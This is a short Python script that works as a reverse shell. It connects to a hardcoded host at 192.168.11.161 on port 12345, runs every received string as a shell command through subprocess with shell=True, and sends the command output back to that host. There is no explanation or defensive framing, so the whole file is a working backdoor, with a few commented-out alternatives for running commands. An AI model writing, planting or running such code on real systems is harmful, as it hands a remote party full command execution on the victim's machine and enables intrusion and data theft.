import socket
import subprocess
import os

host = '192.168.11.161'
port = 12345

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("Connecting to server...")
try:
    s.connect((host, port))
    print(f"Connected to {host}:{port}")
    
    while True:
        data = s.recv(5000)
        print(f"Executing command: {data.decode()}")
        op = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        # op.run(data.decode())
        # os.system('cmd /c ' + data.decode())
        s.sendall(op.stdout.read() + op.stderr.read())
        # s.sendall("Command executed".encode())
        # report = op.stdout.read() + op.stderr.read()
        # print(report)
        # s.sendall(report)
        
except Exception as e:
    print("Connection failed")
    print(e)